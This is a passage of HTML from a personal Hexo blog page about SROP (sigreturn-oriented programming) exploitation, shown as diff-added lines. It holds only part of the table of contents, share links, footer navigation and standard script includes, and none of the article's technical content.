toc-level-3"><a class="toc-link" href="#system-call-chains"><span class="toc-number">3.1.</span> <span class="toc-text">system call chains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84gadget"><span class="toc-number">3.2.</span> <span class="toc-text">可利用的gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">具体的利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.4.</span> <span class="toc-text">实例</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/16/Pwn/srop/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/16/Pwn/srop/&text=Srop"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/16/Pwn/srop/&is_video=false&description=Srop"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Srop&body=Check out this article: http://example.com/2022/04/16/Pwn/srop/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/16/Pwn/srop/&title=Srop"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/16/Pwn/srop/&name=Srop&description=srop的学习与思考。"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/16/Pwn/srop/&t=Srop"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    Pursue
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
